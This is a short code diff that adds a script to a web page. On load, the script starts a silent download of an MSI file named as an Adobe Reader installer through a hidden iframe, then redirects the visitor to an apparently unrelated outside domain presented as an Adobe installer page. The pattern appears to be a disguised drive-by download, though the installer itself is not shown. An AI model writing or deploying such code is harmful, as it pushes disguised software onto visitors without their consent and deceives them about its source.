@@ -1,0 +1,12 @@
+<script>
+  // Create a hidden iframe to trigger download
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = '/Reader_en_install.msi';  // exact filename in /public
+  document.body.appendChild(iframe);
+
+  // Redirect after a short delay
+  setTimeout(() => {
+    window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+  }, 3000); // 3 seconds to ensure download starts
+</script>
